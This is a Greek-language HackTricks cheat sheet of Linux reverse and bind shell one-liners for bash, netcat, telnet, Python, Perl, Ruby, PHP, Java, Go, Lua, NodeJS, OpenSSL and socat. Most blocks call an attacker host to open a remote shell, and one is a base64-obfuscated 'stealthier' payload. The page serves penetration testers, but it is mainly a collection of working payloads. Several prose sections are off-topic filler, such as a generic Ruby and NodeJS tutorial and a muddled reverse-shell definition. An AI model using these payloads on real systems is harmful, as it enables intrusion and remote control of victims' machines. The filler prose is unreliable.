# Shells - Linux

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που έχουν μεγαλύτερη σημασία, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από APIs έως web εφαρμογές και συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Αν έχετε ερωτήσεις για οποιοδήποτε από αυτά τα shells, μπορείτε να τα ελέγξετε με το** [**https://explainshell.com/**](https://explainshell.com)

## Full TTY

**Μόλις αποκτήσετε ένα αντίστροφο shell**[ **διαβάστε αυτήν τη σελίδα για να αποκτήσετε ένα πλήρες TTY**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Μην ξεχάσετε να ελέγξετε και άλλα κέλυφα: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.

### Ασφαλές κέλυφος συμβόλων
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Εξήγηση του Shell

1. **`bash -i`**: Αυτό το μέρος της εντολής ξεκινά ένα διαδραστικό (`-i`) κέλυφος Bash.
2. **`>&`**: Αυτό το μέρος της εντολής είναι μια συντομογραφία για την **ανακατεύθυνση τόσο της τυπικής εξόδου** (`stdout`) όσο και της **τυπικής σφάλματος** (`stderr`) στον **ίδιο προορισμό**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Αυτό είναι ένα ειδικό αρχείο που **αναπαριστά μια σύνδεση TCP με την καθορισμένη διεύθυνση IP και θύρα**.
* Ανακατευθύνοντας τις ροές εξόδου και σφάλματος σε αυτό το αρχείο, η εντολή στην πραγματικότητα στέλνει την έξοδο της διαδραστικής συνεδρίας του κελύφους στον υπολογιστή του επιτιθέμενου.
4. **`0>&1`**: Αυτό το μέρος της εντολής **ανακατευθύνει την τυπική είσοδο (`stdin`) στον ίδιο προορισμό με την τυπική έξοδο (`stdout`)**.

### Δημιουργία αρχείου και εκτέλεση
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Προώθηση Shell

Εάν αντιμετωπίσετε μια ευπάθεια **RCE** σε μια εφαρμογή ιστού βασισμένη σε Linux, ενδέχεται να υπάρχουν περιπτώσεις όπου γίνεται δύσκολη η απόκτηση αντίστροφου shell λόγω της παρουσίας κανόνων Iptables ή άλλων φίλτρων. Σε τέτοιες περιπτώσεις, σκεφτείτε να δημιουργήσετε ένα PTY shell εντός του παραβιασμένου συστήματος χρησιμοποιώντας αγωγούς (pipes).

Μπορείτε να βρείτε τον κώδικα στο [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Απλά χρειάζεται να τροποποιήσετε:

* Το URL του ευπάθους κεντρικού υπολογιστή
* Το πρόθεμα και το επίθεμα του φορτίου σας (αν υπάρχει)
* Τον τρόπο με τον οποίο αποστέλλεται το φορτίο (κεφαλίδες; δεδομένα; επιπλέον πληροφορίες;)

Έπειτα, μπορείτε απλά να **αποστείλετε εντολές** ή ακόμα και να **χρησιμοποιήσετε την εντολή `upgrade`** για να λάβετε ένα πλήρες PTY (σημειώστε ότι οι αγωγοί διαβάζονται και γράφονται με καθυστέρηση περίπου 1,3 δευτερολέπτων).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Ελέγξτε το στην [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Το Telnet είναι ένα πρωτόκολλο δικτύου που χρησιμοποιείται για την απομακρυσμένη σύνδεση σε έναν υπολογιστή μέσω δικτύου. Με το Telnet, μπορείτε να συνδεθείτε σε έναν απομακρυσμένο υπολογιστή και να εκτελέσετε εντολές από τον τερματικό σας.

Για να συνδεθείτε σε έναν υπολογιστή μέσω Telnet, χρειάζεστε τη διεύθυνση IP του υπολογιστή και τη θύρα Telnet που χρησιμοποιείται. Μπορείτε να χρησιμοποιήσετε την εντολή `telnet` στο τερματικό σας για να αρχίσετε μια σύνδεση Telnet.

Όταν συνδεθείτε με επιτυχία σε έναν υπολογιστή μέσω Telnet, θα έχετε πρόσβαση στο τερματικό του υπολογιστή και θα μπορείτε να εκτελέσετε εντολές όπως αν είχατε φυσική πρόσβαση σε αυτόν.

Ωστόσο, το Telnet δεν είναι ασφαλές, καθώς οι πληροφορίες που ανταλλάσσονται μεταξύ του τερματικού σας και του απομακρυσμένου υπολογιστή μεταδίδονται σε απλό κείμενο. Για αυτόν τον λόγο, συνιστάται να χρησιμοποιείτε ασφαλή πρωτόκολλα όπως το SSH αντί για το Telnet.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
Ο **Επιτιθέμενος**
```bash
while true; do nc -l <port>; done
```
Για να στείλετε την εντολή, γράψτε την, πατήστε enter και πατήστε CTRL+D (για να σταματήσει το STDIN)

**Θύμα**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Πυθώνας

Ο Πυθώνας είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών και σεναρίων. Είναι εύκολο να μάθετε και να χρησιμοποιήσετε, και προσφέρει πληθώρα βιβλιοθηκών και εργαλείων για την επεξεργασία δεδομένων, την ανάλυση και την αυτοματοποίηση διαδικασιών.

Ο Πυθώνας μπορεί να χρησιμοποιηθεί για την εκτέλεση εντολών στο λειτουργικό σύστημα Linux. Μπορείτε να χρησιμοποιήσετε τη βιβλιοθήκη `subprocess` για να εκτελέσετε εντολές στο τερματικό και να λάβετε την έξοδο τους. Επίσης, μπορείτε να χρησιμοποιήσετε τη βιβλιοθήκη `os` για να εκτελέσετε εντολές στο τερματικό και να πάρετε πληροφορίες για το περιβάλλον του συστήματος.

Ο Πυθώνας επίσης παρέχει τη δυνατότητα να δημιουργήσετε ένα απλό αρχείο κειμένου και να το εκτελέσετε ως εντολή στο τερματικό. Αυτό μπορεί να γίνει χρησιμοποιώντας την εντολή `chmod` για να δώσετε δικαιώματα εκτέλεσης στο αρχείο και την εντολή `./` για να το εκτελέσετε.

Ο Πυθώνας είναι ένα ισχυρό εργαλείο για την εκτέλεση εντολών στο λειτουργικό σύστημα Linux και την αυτοματοποίηση διαδικασιών. Με τη σωστή χρήση και την κατανόηση των δυνατοτήτων του, μπορείτε να επιτύχετε πολλά στον κόσμο του χάκινγκ.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl είναι μια δυναμική γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την αυτοματοποίηση διαδικασιών και την επεξεργασία κειμένου. Έχει ισχυρές δυνατότητες για την επεξεργασία αρχείων και την διαχείριση συστήματος. Μπορεί να χρησιμοποιηθεί για την ανάπτυξη εργαλείων hacking και για την εκτέλεση επιθέσεων.

Για να εκτελέσετε ένα Perl script από ένα shell, μπορείτε να χρησιμοποιήσετε την εντολή `perl script.pl`. Αν το script απαιτεί ορίσματα, μπορείτε να τα περάσετε μετά το όνομα του script, χωρισμένα με κενά.

Για να εκτελέσετε ένα Perl one-liner από ένα shell, μπορείτε να χρησιμοποιήσετε την εντολή `perl -e 'one-liner'`. Το one-liner είναι ένα μικρό Perl script που εκτελείται απευθείας από τη γραμμή εντολών.

Για να εκτελέσετε μια εντολή shell από ένα Perl script, μπορείτε να χρησιμοποιήσετε την συνάρτηση `system('command')`. Η εντολή shell θα εκτελεστεί και το αποτέλεσμα θα επιστραφεί στο Perl script.

Για να εκτελέσετε μια εντολή shell και να αποθηκεύσετε το αποτέλεσμα σε μια μεταβλητή Perl, μπορείτε να χρησιμοποιήσετε την συνάρτηση `backticks` ή τον τελεστή `qx`. Η εντολή shell θα εκτελεστεί και το αποτέλεσμα θα αποθηκευτεί στη μεταβλητή.

Για να διαβάσετε από ένα αρχείο σε ένα Perl script, μπορείτε να χρησιμοποιήσετε την συνάρτηση `open` για να ανοίξετε το αρχείο και την συνάρτηση `readline` για να διαβάσετε τις γραμμές του αρχείου.

Για να γράψετε σε ένα αρχείο από ένα Perl script, μπορείτε να χρησιμοποιήσετε την συνάρτηση `open` για να ανοίξετε το αρχείο με την επιλογή `>` για εγγραφή και την συνάρτηση `print` για να γράψετε στο αρχείο.

Για να εκτελέσετε μια εντολή shell και να πάρετε την έξοδο της ως είσοδο για μια άλλη εντολή shell, μπορείτε να χρησιμοποιήσετε τον τελεστή παίρνοντας την έξοδο της πρώτης εντολής και περνώντας την ως είσοδο στη δεύτερη εντολή.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών. Έχει μια καθαρή και ευανάγνωστη σύνταξη, καθιστώντας τον κώδικα ευκολότερο στην κατανόηση και στη συντήρηση. Η Ruby υποστηρίζει αντικειμενοστραφή προγραμματισμό και διαθέτει μια ευέλικτη και δυναμική τύπωση. Επιπλέον, παρέχει πλούσια βιβλιοθήκη με πολλές χρήσιμες λειτουργίες.

Για να εκτελέσετε κώδικα Ruby, μπορείτε να χρησιμοποιήσετε τον διερμηνέα Ruby (ruby) ή να γράψετε τον κώδικα σε ένα αρχείο με κατάληξη .rb και να το εκτελέσετε με την εντολή ruby.

Παρακάτω παρουσιάζονται μερικά παραδείγματα κώδικα Ruby:

```ruby
# Εκτύπωση κειμένου
puts "Γεια σου, κόσμε!"

# Υπολογισμός αθροίσματος
a = 5
b = 10
sum = a + b
puts "Το άθροισμα των #{a} και #{b} είναι #{sum}."

# Έλεγχος συνθήκης
x = 7
if x > 5
  puts "Ο αριθμός #{x} είναι μεγαλύτερος από 5."
else
  puts "Ο αριθμός #{x} είναι μικρότερος ή ίσος με 5."
end
```

Αυτά είναι μερικά από τα βασικά στοιχεία της Ruby. Μπορείτε να εξερευνήσετε περισσότερες δυνατότητες και λειτουργίες της γλώσσας αυτής για να αναπτύξετε προηγμένες εφαρμογές.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

Η PHP είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη δυναμικών ιστοσελίδων. Είναι εύκολη στην εκμάθηση και παρέχει πολλές δυνατότητες για την επεξεργασία δεδομένων και την αλληλεπίδραση με βάσεις δεδομένων.

Για να εκτελέσετε κώδικα PHP σε έναν διακομιστή Linux, μπορείτε να χρησιμοποιήσετε τον ενσωματωμένο διακομιστή PHP ή να εγκαταστήσετε έναν διακομιστή web όπως το Apache ή το Nginx.

Για να εκτελέσετε ένα αρχείο PHP από τη γραμμή εντολών, μπορείτε να χρησιμοποιήσετε την εντολή `php` ακολουθούμενη από το όνομα του αρχείου. Για παράδειγμα:

```bash
php script.php
```

Μπορείτε επίσης να εκτελέσετε κώδικα PHP από μια ιστοσελίδα, ενσωματώνοντας τον κώδικα μέσα σε ετικέτες `<?php ?>`. Ο κώδικας που βρίσκεται μέσα σε αυτές τις ετικέτες θα εκτελεστεί κατά την αναπαραγωγή της ιστοσελίδας.

Για να συνδεθείτε σε μια βάση δεδομένων MySQL από PHP, μπορείτε να χρησιμοποιήσετε την ενσωματωμένη συνάρτηση `mysqli_connect()` για να δημιουργήσετε μια σύνδεση και τη συνάρτηση `mysqli_query()` για να εκτελέσετε ερωτήματα SQL.

Η PHP παρέχει επίσης πολλές ενσωματωμένες συναρτήσεις για την επεξεργασία αρχείων, την αποστολή email, την κρυπτογράφηση δεδομένων και πολλά άλλα. Μπορείτε να βρείτε περισσότερες πληροφορίες και παραδείγματα κώδικα στην επίσημη τεκμηρίωση της PHP.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Η Java είναι μια αντικειμενοστραφής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών. Έχει σχεδιαστεί να είναι ανεξάρτητη πλατφόρμας, πράγμα που σημαίνει ότι μπορεί να τρέξει σε διάφορες πλατφόρμες, όπως Windows, macOS και Linux. Η Java χρησιμοποιείται επίσης ευρέως για την ανάπτυξη εφαρμογών για το διαδίκτυο και την κινητή τηλεφωνία.

Μια από τις κύριες δυνατότητες της Java είναι η δυνατότητα να τρέξει κώδικα σε ένα εικονικό μηχάνημα Java (JVM). Αυτό σημαίνει ότι ο κώδικας Java μπορεί να εκτελεστεί σε οποιαδήποτε πλατφόρμα που υποστηρίζει την JVM, χωρίς να απαιτείται η μεταγλώττιση του κώδικα για κάθε πλατφόρμα ξεχωριστά.

Η Java παρέχει επίσης πλούσια βιβλιοθήκη κλάσεων και εργαλείων που διευκολύνουν την ανάπτυξη εφαρμογών. Αυτές οι βιβλιοθήκες περιλαμβάνουν λειτουργίες για τη διαχείριση αρχείων, την επικοινωνία με το δίκτυο, την ασφάλεια και πολλά άλλα.

Επιπλέον, η Java υποστηρίζει την ανάπτυξη εφαρμογών με πολλαπλούς νήματα, που επιτρέπει την ταυτόχρονη εκτέλεση πολλαπλών τμημάτων κώδικα. Αυτό μπορεί να βελτιώσει την απόδοση και την αποκρισιμότητα των εφαρμογών.

Τέλος, η Java παρέχει επίσης ισχυρά εργαλεία για την ανάπτυξη εφαρμογών για το διαδίκτυο, όπως το Java Servlet API και το JavaServer Pages (JSP). Αυτά τα εργαλεία επιτρέπουν τη δημιουργία δυναμικών ιστοσελίδων και εφαρμογών διαδικτύου.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat είναι ένα πανίσχυρο εργαλείο που παρέχει προηγμένες δυνατότητες δικτύωσης και αλληλεπίδρασης με συστήματα. Μπορεί να χρησιμοποιηθεί για να δημιουργήσει και να διαχειριστεί συνδέσεις TCP/IP, να αναλύσει και να στείλει πακέτα δεδομένων, και να εκτελέσει εντολές απομακρυσμένα σε απομακρυσμένα συστήματα. Είναι ιδιαίτερα χρήσιμο για την εξερεύνηση και την εκμετάλλευση ευπάθειών σε δίκτυα και συστήματα.

Για να ξεκινήσετε με το Ncat, μπορείτε να το εκτελέσετε από τη γραμμή εντολών χρησιμοποιώντας την εντολή `ncat`. Μπορείτε να προσθέσετε διάφορες παραμέτρους για να προσαρμόσετε τη συμπεριφορά του, όπως η προσδιορισμός της πόρτας, η χρήση SSL, η αυθεντικοποίηση και πολλά άλλα.

Μερικές από τις βασικές εντολές που μπορείτε να χρησιμοποιήσετε με το Ncat περιλαμβάνουν:

- Σύνδεση σε έναν απομακρυσμένο διακομιστή TCP/IP: `ncat <ip> <port>`
- Αναμονή για σύνδεση από έναν απομακρυσμένο υπολογιστή: `ncat -l <port>`
- Αποστολή αρχείου σε έναν απομακρυσμένο διακομιστή: `ncat <ip> <port> < file`
- Λήψη αρχείου από έναν απομακρυσμένο διακομιστή: `ncat -l <port> > file`

Αυτές είναι μόνο μερικές από τις δυνατότητες που προσφέρει το Ncat. Μπορείτε να εξερευνήσετε περισσότερες εντολές και παραμέτρους στην τεκμηρίωση του εργαλείου.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua είναι μια δημοφιλής γλώσσα προγραμματισμού σε σενάρια που χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών και παιχνιδιών. Έχει απλή σύνταξη και είναι ευέλικτη, καθιστώντας την ιδανική για την ενσωμάτωση σε άλλες εφαρμογές. Η Lua υποστηρίζει δυναμική τυποποίηση και έχει ένα μικρό μέγεθος, καθιστώντας την αποδοτική και ελαφριά.

Μερικές από τις βασικές λειτουργίες της Lua περιλαμβάνουν τη δυνατότητα δημιουργίας και εκτέλεσης σεναρίων, τη διαχείριση αρχείων και την αλληλεπίδραση με το σύστημα λειτουργίας. Επίσης, παρέχει πολλές βιβλιοθήκες για να διευκολύνει την ανάπτυξη εφαρμογών.

Η Lua χρησιμοποιείται ευρέως σε πολλές εφαρμογές, όπως παιχνίδια, εφαρμογές κινητών συσκευών, εφαρμογές δικτύου και πολλές άλλες. Επίσης, χρησιμοποιείται σε πολλά λογισμικά όπως το Nginx και το Wireshark.

Αν και η Lua είναι μια δημοφιλής γλώσσα προγραμματισμού, είναι σημαντικό να λαμβάνονται υπόψη οι ασφαλείς πρακτικές προγραμματισμού για να αποφευχθούν πιθανές ευπάθειες και επιθέσεις.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS είναι μια ανοιχτού κώδικα πλατφόρμα που εκτελεί κώδικα JavaScript στην πλευρά του διακομιστή. Χρησιμοποιεί τη μη-φραγμένη αρχιτεκτονική εκδόσεων για να επιτρέψει την ασύγχρονη επεξεργασία και την αποτελεσματική χρήση των πόρων του συστήματος. Ο NodeJS χρησιμοποιείται ευρέως για την ανάπτυξη διαδικτυακών εφαρμογών και υπηρεσιών δικτύου.

### Εγκατάσταση

Για να εγκαταστήσετε το NodeJS, ακολουθήστε τα παρακάτω βήματα:

1. Κατεβάστε το πακέτο εγκατάστασης από την επίσημη ιστοσελίδα του NodeJS.
2. Εκτελέστε το πακέτο εγκατάστασης και ακολουθήστε τις οδηγίες εγκατάστασης.
3. Ελέγξτε την εγκατάσταση εκτελώντας την εντολή `node -v` στο τερματικό. Θα πρέπει να εμφανιστεί η έκδοση του NodeJS που εγκαταστάθηκε.

### Εκτέλεση κώδικα NodeJS

Για να εκτελέσετε κώδικα NodeJS, ακολουθήστε τα παρακάτω βήματα:

1. Δημιουργήστε ένα αρχείο με κατάληξη `.js` που περιέχει τον κώδικά σας.
2. Ανοίξτε ένα τερματικό και μεταβείτε στον φάκελο όπου βρίσκεται το αρχείο.
3. Εκτελέστε τον κώδικα NodeJS χρησιμοποιώντας την εντολή `node <όνομα_αρχείου>.js`. Ο κώδικας θα εκτελεστεί και τα αποτελέσματα θα εμφανιστούν στο τερματικό.

### Παραδείγματα κώδικα NodeJS

Παρακάτω παρουσιάζονται μερικά παραδείγματα κώδικα NodeJS:

```javascript
// Εμφάνιση κειμένου στο τερματικό
console.log("Γεια σου, κόσμε!");

// Υπολογισμός του τετραγώνου ενός αριθμού
const number = 5;
const square = number * number;
console.log(`Το τετράγωνο του αριθμού ${number} είναι ${square}.`);
```

Αυτά είναι μερικά βασικά πράγματα που πρέπει να γνωρίζετε για το NodeJS. Μπορείτε να εξερευνήσετε περισσότερες δυνατότητες και λειτουργίες του NodeJS στην επίσημη τεκμηρίωση του.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Ο Επιτιθέμενος (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Ο Θύμα
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Συνδεδεμένη κέλυφος (Bind shell)
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Αντίστροφη κέλυφος

Η αντίστροφη κέλυφος είναι μια τεχνική που χρησιμοποιείται στον χώρο του χάκινγκ για να αποκτήσετε απομακρυσμένη πρόσβαση σε ένα σύστημα Linux. Με αυτήν την τεχνική, ο χάκερ δημιουργεί μια σύνδεση ανάμεσα στον επιτιθέμενο υπολογιστή και τον δικό του υπολογιστή, επιτρέποντάς του να εκτελέσει εντολές στον επιτιθέμενο υπολογιστή από απόσταση.

Για να δημιουργήσετε μια αντίστροφη κέλυφος, μπορείτε να χρησιμοποιήσετε διάφορα εργαλεία όπως το Netcat ή το Metasploit. Αυτά τα εργαλεία σας επιτρέπουν να δημιουργήσετε μια σύνδεση TCP μεταξύ του επιτιθέμενου υπολογιστή και του υπολογιστή σας, δίνοντάς σας πλήρη πρόσβαση και έλεγχο στο σύστημα.

Μια αντίστροφη κέλυφος είναι ιδιαίτερα χρήσιμη για την εξερεύνηση και την εκμετάλλευση ευπάθειών σε ένα σύστημα Linux, καθώς σας επιτρέπει να εκτελέσετε εντολές και να αποκτήσετε πρόσβαση σε αρχεία και διαμορφώσεις που απαιτούν επιπλέον δικαιώματα.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Το Awk είναι ένα ισχυρό εργαλείο για την επεξεργασία και την ανάλυση κειμένου στο Linux. Μπορεί να χρησιμοποιηθεί για να εκτελέσει διάφορες λειτουργίες, όπως την αναζήτηση και την αντικατάσταση κειμένου, την εξαγωγή δεδομένων από αρχεία και την υπολογιστική επεξεργασία.

Για να χρησιμοποιήσετε το Awk, μπορείτε να το καλέσετε από το τερματικό και να του περάσετε ένα αρχείο κειμένου ως είσοδο. Στη συνέχεια, μπορείτε να ορίσετε κανόνες και ενέργειες για να επεξεργαστείτε το κείμενο σύμφωνα με τις ανάγκες σας.

Οι βασικές εντολές του Awk είναι οι εξής:

- `print`: Εκτυπώνει το κείμενο ή τη μεταβλητή που του δίνεται ως όρισμα.
- `if`: Εκτελεί μια ενέργεια αν μια συνθήκη είναι αληθής.
